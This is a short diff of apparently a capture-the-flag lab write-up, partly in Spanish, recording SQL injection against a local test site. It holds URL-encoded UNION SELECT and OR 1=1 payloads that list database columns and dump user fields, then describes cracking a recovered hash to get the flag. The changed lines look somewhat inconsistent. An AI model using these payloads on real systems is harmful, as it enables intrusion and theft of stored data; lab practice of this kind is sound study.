@@ -9,8 +9,9 @@ http://localhost:8080/index.php?page=member&id=1+OR+EXISTS+%28SELECT+*+FROM+user
 http://localhost:8080/index.php?page=member&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
 1 UNION SELECT table_name, column_name FROM information_schema.columns
 
-"users" table contains the following columns: user_id, first_name, last_name, town, country, planet, Commentaire, countersign.
+"list_images" table contains the following columns: id, url, title, comment
 
-1 OR 1=1 UNION SELECT Commentaire, countersign from users
+1 OR 1=1 UNION SELECT title, comment from users
 desencriptar con md5 la clave hacer lowercase y encriptar con sha256
-Se convierte en "FortyTwo"
+"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
+se convierte en "albatroz"
